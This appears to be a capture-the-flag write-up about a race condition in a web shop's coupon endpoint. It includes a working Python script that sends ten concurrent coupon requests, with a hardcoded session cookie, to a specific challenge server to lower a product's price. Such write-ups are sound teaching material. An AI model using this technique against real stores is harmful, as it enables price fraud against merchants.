![image](https://github.com/user-attachments/assets/91950c02-3ff0-44b6-8deb-34766fd7871b)

# Exploration
Since the challenge provided the source code, let's take a look in that.
![image](https://github.com/user-attachments/assets/d05da055-7412-4b3e-a01f-5c2989318d7a)
<br>We'll focus on the ```apply coupon``` endpoint.

Let's try to understand what the code does.
1. Get Necessary data like user-id and coupon code.
2. If coupon code is 'race', !!!!sleep for 0.5 seconds!!!! and reduce product price. last return new price.
3. If coupon code is incorrect, return failed.

See how it sleeps for 0.5 seconds. We can actually abuse to vulnerability called Race Condition.
To exploit it, use multithreading.

# Solution
The basic of this exploitation is to send many requests at the same time while the sleeping period of the system.
![image](https://github.com/user-attachments/assets/7a71c54b-5073-4a20-8c4e-74d4d8497c68)
![image](https://github.com/user-attachments/assets/72305853-604c-42c2-91ce-663bec6f1b11)

For some reason burp suite is not fast enough to execute it.
<br>Therefore, i've written a python code to automate it.
<br>**Note: Make sure to change the cookie according to your website**

After this, just buy the product and will get the flag.

```import requests
from concurrent.futures import ThreadPoolExecutor

# Function to send a POST request
def send_request():
    cookies = {
        'session': 'eyJ1c2VyX2lkIjoiMDllNTIxMWRhNzQzZDcyYSJ9.Zr2LsQ.NXJgr647DhTEn5kLEk3to7FjMvc',}
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en,zh-CN;q=0.9,zh;q=0.8,th;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'session=eyJ1c2VyX2lkIjoiNjU4ODVjYTFhZTY3NDFlNiJ9.ZrxAOA.xuxRQ09Zh3HAMrjZOHin22dRIrY',
        'DNT': '1',
        'Origin': 'http://185.218.124.252:1337',
        'Referer': 'http://185.218.124.252:1337/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        }

    data = {
        'coupon_code': 'race',
    }

    response = requests.post('http://185.218.124.252:1337/apply_coupon', cookies=cookies, headers=headers, data=data, verify=False)
    return response.status_code, response.text

# Use ThreadPoolExecutor to send 10 requests concurrently
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(send_request) for _ in range(10)]

    for future in futures:
        status_code, response_text = future.result()
        print(f"Status Code: {status_code}, Response: {response_text}")```
```

![image](https://github.com/user-attachments/assets/b8f63be5-92ba-45e5-98d2-2c71cd16e900)

